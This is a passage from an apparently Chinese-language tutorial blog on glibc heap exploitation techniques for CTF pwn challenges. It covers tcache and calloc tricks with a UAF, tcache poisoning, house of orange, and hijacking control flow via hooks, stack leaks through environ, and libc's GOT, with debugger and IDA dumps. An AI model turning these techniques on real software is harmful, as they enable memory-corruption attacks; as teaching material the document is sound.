class="line">calloc(<span class="number">0x400</span>) <span class="comment">#13</span></span><br><span class="line">edit(<span class="number">13</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x400</span>+p64(prev_size)+p64(size)+p64(target_add-<span class="number">0x10</span>))</span><br><span class="line">calloc(<span class="number">0xa0</span>)</span><br></pre></td></tr></table></figure><p><strong>限制:</strong></p><ul><li>需要UAF</li><li>主要适用于只有calloc并且可以分配tcache大小的chunk的情况，对于有malloc，打tcache poison更加方便</li></ul><p><strong>效果:</strong></p><ul><li>获得任意地址target_addr的控制权：在上述流程中，直接将chunk_A的bk改为target_addr - 0x10，并且保证target_addr - 0x10的bk的fd为一个可写地址（一般情况下，使target_addr - 0x10的bk，即target_addr + 8处的值为一个可写地址即可）。</li><li>在任意地址target_addr写入大数值：在unsorted bin attack后，有时候要修复链表，在链表不好修复时，可以采用此利用达到同样的效果，在高版本glibc下，unsorted bin attack失效后，此利用应用更为广泛。在上述流程中，需要使tcache bin中原先有六个堆块，然后将chunk_A的bk改为target_addr - 0x10即可。</li></ul><h2 id="tcache-poison">tcache poison</h2><p>主要是通过改写tcache的next指针，实现类似于fastbin的house of spirit的效果。</p><h2 id="house-of-orange">house of orange</h2><p>house of orange 原利用链中的IO_FILE相关利用已经失效了，这里主要关注其绕过无free函数限制的方法，即通过malloc大于top chunk大小的chunk时会先释放top chunk，再拓展堆区域。</p><p>一般而言，修改top chunk需要满足一下条件。</p><ol><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><h1 id="攻击面">攻击面</h1><ul><li>劫持控制流<ul><li>hooks</li><li>stack</li><li>IO_FILE</li><li>dlts</li><li>libc.got</li></ul></li><li>辅助攻击链<ul><li>tcache_perthread_struct</li><li>global_max_fast</li><li>heap 管理结构</li></ul></li></ul><h2 id="劫持控制流">劫持控制流</h2><h3 id="hooks">hooks</h3><p>堆利用中最基本的夺取控制流的方法就是打各种hooks。<br>一般而言，可以利用__free_hook 加 写入’/bin/sh’的堆快实现劫持。</p><p>此外，如果要打one_gadget的话，可以打__malloc_hook，在tcache之前的版本，更多是打__malloc_hook，因为其在main_arena附近，存在许多libc上地址，方便通过错位构造0x7f的size，此外，由于__malloc_hook和__realloc_hook临近，也可以很方便地同时控制这两个hook，然后通过__realloc_hook配合来调整栈帧，方便满足one gadget 条件</p><p>而在glibc2.34版本及以上，各类hooks都已经被移除，因此也需要掌握一些其他的劫持控制流的办法。</p><h3 id="stack">stack</h3><p>在stack overflow 中，通过栈和ROP劫持控制流的方法我们已经不陌生，然而不像stack overflow 天然可以在栈上写入，如果要在heap exploation中通过ROP来劫持控制流，一个无法绕过的问题是栈地址不可知。</p><p>我们都知道程序加载时，环境变量会被压入栈中，可以通过environ指针访问到栈上环境变量。</p><p>查看glibc源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> !_LIBC</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __environenviron</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> HAVE_ENVIRON_DECL</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>发现这是一个extern变量，在gdb中调试查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0x7f78a14d4000</span>     <span class="number">0x7f78a1500000</span> r--p    <span class="number">2</span>c000      <span class="number">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a1500000</span>     <span class="number">0x7f78a1668000</span> r-xp   <span class="number">168000</span>  <span class="number">2</span>c000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a1668000</span>     <span class="number">0x7f78a16bd000</span> r--p    <span class="number">55000</span> <span class="number">194000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16bd000</span>     <span class="number">0x7f78a16be000</span> ---p     <span class="number">1000</span> <span class="number">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16be000</span>     <span class="number">0x7f78a16c1000</span> r--p     <span class="number">3000</span> <span class="number">1e9000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16c1000</span>     <span class="number">0x7f78a16c4000</span> rw-p     <span class="number">3000</span> <span class="number">1</span>ec000 /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/libc.so<span class="number">.6</span></span><br><span class="line">    <span class="number">0x7f78a16c4000</span>     <span class="number">0x7f78a16d3000</span> rw-p     f000      <span class="number">0</span> [anon_7f78a16c4]</span><br><span class="line">    <span class="number">0x7f78a16d3000</span>     <span class="number">0x7f78a16d4000</span> r--p     <span class="number">1000</span>      <span class="number">0</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a16d4000</span>     <span class="number">0x7f78a16f8000</span> r-xp    <span class="number">24000</span>   <span class="number">1000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a16f8000</span>     <span class="number">0x7f78a1702000</span> r--p     a000  <span class="number">25000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a1702000</span>     <span class="number">0x7f78a1704000</span> r--p     <span class="number">2000</span>  <span class="number">2e000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7f78a1704000</span>     <span class="number">0x7f78a1706000</span> rw-p     <span class="number">2000</span>  <span class="number">30000</span> /home/nemo/Pwn/workspace/write-ups/MetaCtf<span class="number">.2021</span>/pwn/Hookless/ld.so<span class="number">.2</span></span><br><span class="line">    <span class="number">0x7ffd6bb9e000</span>     <span class="number">0x7ffd6bbc0000</span> rw-p    <span class="number">22000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br><span class="line">    <span class="number">0x7ffd6bbd4000</span>     <span class="number">0x7ffd6bbd8000</span> r--p     <span class="number">4000</span>      <span class="number">0</span> [vvar]</span><br><span class="line">    <span class="number">0x7ffd6bbd8000</span>     <span class="number">0x7ffd6bbda000</span> r-xp     <span class="number">2000</span>      <span class="number">0</span> [vdso]</span><br><span class="line"><span class="number">0xffffffffff600000</span> <span class="number">0xffffffffff601000</span> --xp     <span class="number">1000</span>      <span class="number">0</span> [vsyscall]</span><br><span class="line">pwndbg&gt; p environ</span><br><span class="line">$<span class="number">1</span> = (<span class="type">char</span> **) <span class="number">0x7ffd6bbbdfc8</span></span><br><span class="line">pwndbg&gt; p &amp;environ</span><br><span class="line">$<span class="number">2</span> = (<span class="type">char</span> ***) <span class="number">0x7f78a16c9ec0</span> &lt;environ&gt;</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到其存在于anon_7f78a16c4段，在libc后，与libc存在固定偏移，猜测这一部分内容与ld 过程有关（笔者暂且还没有查证）</p><p>既然可以通过访问libc偏移地址leak stack地址，那么此时我们就可以通过这个栈地址分配到栈上来ROP了。</p><p>此攻击点的优点是不像IO_FILE的攻击那样，需要触发程序结束时（exit()函数，从main返回，malloc_assert）时清理现场的流程，可以覆盖堆菜单中分配函数或者edit函数的栈来实现攻击。</p><h3 id="libc-got">libc.got</h3><p>checksec libc，会发现其一般开启了Partial RELRO，所以可以考虑写libc的got表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec libc.so.6       </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>笔者在实际操作时发现，pwntools的elf.got并不能很好解析libc的got段，可以使用IDA来查看。</p><p>以下的got表来自libc2.34</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:<span class="number">00000000001</span>ED000 ; Segment type: Pure data</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 _got_plt        segment qword public <span class="string">&#x27;DATA&#x27;</span> use64</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000                 assume cs:_got_plt</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000                 ;org <span class="number">1</span>ED000h</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED008 qword_1ED008    dq <span class="number">0</span>                    ; DATA XREF: sub_2C000↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED010 qword_1ED010    dq <span class="number">0</span>                    ; DATA XREF: sub_2C000+<span class="number">6</span>↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018 off_1ED018      dq offset __strnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018                                         ; DATA XREF: j___strnlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED018                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020 off_1ED020      dq offset __rawmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020                                         ; DATA XREF: j___rawmemchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED020                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED028 off_1ED028      dq offset __GI___libc_realloc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED028                                         ; DATA XREF: _realloc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030 off_1ED030      dq offset __strncasecmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030                                         ; DATA XREF: j___strncasecmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED030                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED038 off_1ED038      dq offset _dl_exception_create</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED038                                         ; DATA XREF: __dl_exception_create↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040 off_1ED040      dq offset __mempcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040                                         ; DATA XREF: j___mempcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED040                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048 off_1ED048      dq offset __wmemset_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048                                         ; DATA XREF: j___wmemset_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED048                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED050 off_1ED050      dq offset __libc_calloc ; DATA XREF: _calloc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED058 off_1ED058      dq offset strspn_ifunc  ; DATA XREF: j_strspn_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED058                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED060 off_1ED060      dq offset memchr_ifunc  ; DATA XREF: j_memchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED060                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068 off_1ED068      dq offset __libc_memmove_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068                                         ; DATA XREF: j___libc_memmove_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED068                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070 off_1ED070      dq offset __wmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070                                         ; DATA XREF: j___wmemchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED070                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078 off_1ED078      dq offset __stpcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078                                         ; DATA XREF: j___stpcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED078                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080 off_1ED080      dq offset __wmemcmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080                                         ; DATA XREF: j___wmemcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED080                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED088 off_1ED088      dq offset _dl_find_dso_for_object</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED088                                         ; DATA XREF: __dl_find_dso_for_object↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED090 off_1ED090      dq offset strncpy_ifunc ; DATA XREF: j_strncpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED090                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED098 off_1ED098      dq offset strlen_ifunc  ; DATA XREF: j_strlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED098                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0 off_1ED0A0      dq offset __strcasecmp_l_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0                                         ; DATA XREF: j___strcasecmp_l_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A8 off_1ED0A8      dq offset strcpy_ifunc  ; DATA XREF: j_strcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0A8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0 off_1ED0B0      dq offset __wcschr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0                                         ; DATA XREF: j___wcschr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8 off_1ED0B8      dq offset __strchrnul_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8                                         ; DATA XREF: j___strchrnul_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0B8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0 off_1ED0C0      dq offset __memrchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0                                         ; DATA XREF: j___memrchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C8 off_1ED0C8      dq offset _dl_deallocate_tls</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0C8                                         ; DATA XREF: __dl_deallocate_tls↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D0 off_1ED0D0      dq offset __tls_get_addr</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D0                                         ; DATA XREF: ___tls_get_addr↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8 off_1ED0D8      dq offset __wmemset_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8                                         ; DATA XREF: j___wmemset_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0D8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E0 off_1ED0E0      dq offset memcmp_ifunc  ; DATA XREF: j_memcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E0                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8 off_1ED0E8      dq offset __strncasecmp_l_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8                                         ; DATA XREF: j___strncasecmp_l_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0E8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F0 off_1ED0F0      dq offset _dl_fatal_printf</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F0                                         ; DATA XREF: __dl_fatal_printf↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F8 off_1ED0F8      dq offset strcat_ifunc  ; DATA XREF: j_strcat_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED0F8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100 off_1ED100      dq offset __wcscpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100                                         ; DATA XREF: j___wcscpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED100                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED108 off_1ED108      dq offset strcspn_ifunc ; DATA XREF: j_strcspn_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED108                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110 off_1ED110      dq offset __strcasecmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110                                         ; DATA XREF: j___strcasecmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED110                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED118 off_1ED118      dq offset strncmp_ifunc ; DATA XREF: j_strncmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED118                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120 off_1ED120      dq offset __wmemchr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120                                         ; DATA XREF: j___wmemchr_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED120                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128 off_1ED128      dq offset __stpncpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128                                         ; DATA XREF: j___stpncpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED128                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130 off_1ED130      dq offset __wcscmp_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130                                         ; DATA XREF: j___wcscmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED130                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138 off_1ED138      dq offset __libc_memmove_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138                                         ; DATA XREF: j___libc_memmove_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED138                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED140 off_1ED140      dq offset strrchr_ifunc ; DATA XREF: j_strrchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED140                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED148 off_1ED148      dq offset strchr_ifunc  ; DATA XREF: j_strchr_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED148                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150 off_1ED150      dq offset __wcschr_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150                                         ; DATA XREF: j___wcschr_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED150                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158 off_1ED158      dq offset __new_memcpy_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158                                         ; DATA XREF: j___new_memcpy_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED158                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED160 off_1ED160      dq offset _dl_rtld_di_serinfo</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED160                                         ; DATA XREF: __dl_rtld_di_serinfo↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED168 off_1ED168      dq offset _dl_allocate_tls</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED168                                         ; DATA XREF: __dl_allocate_tls↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED170 off_1ED170      dq offset __tunable_get_val</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED170                                         ; DATA XREF: ___tunable_get_val↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178 off_1ED178      dq offset __wcslen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178                                         ; DATA XREF: j___wcslen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED178                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED180 off_1ED180      dq offset memset_ifunc  ; DATA XREF: j_memset_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED180                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188 off_1ED188      dq offset __wcsnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188                                         ; DATA XREF: j___wcsnlen_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED188                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED190 off_1ED190      dq offset strcmp_ifunc  ; DATA XREF: j_strcmp_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED190                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED198 off_1ED198      dq offset _dl_allocate_tls_init</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED198                                         ; DATA XREF: __dl_allocate_tls_init↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A0 off_1ED1A0      dq offset __nptl_change_stack_perm</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A0                                         ; DATA XREF: ___nptl_change_stack_perm↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A8 off_1ED1A8      dq offset strpbrk_ifunc ; DATA XREF: j_strpbrk_ifunc↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1A8                                         ; Indirect relocation</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0 off_1ED1B0      dq offset __strnlen_ifunc</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0                                         ; DATA XREF: j___strnlen_ifunc_0↑r</span><br><span class="line">.got.plt:<span class="number">00000000001</span>ED1B0 _got_plt        ends                    ; Indirect relocation</span><br></pre></td></tr></table></figure><p>可以看到got表中包含了很多字符串和内存相关函数，包括strlen等，为什么strlen这种在libc中实现的函数会需要走got表呢？</p><p>笔者在glibc2.34的源代码中进行了查找:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string/string.h</span></span><br><span class="line"><span class="comment">/* Return the length of S.  */</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> <span class="title function_">strlen</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__s)</span></span><br><span class="line">     __THROW __attribute_pure__ __<span class="title function_">nonnull</span> <span class="params">((<span class="number">1</span>))</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 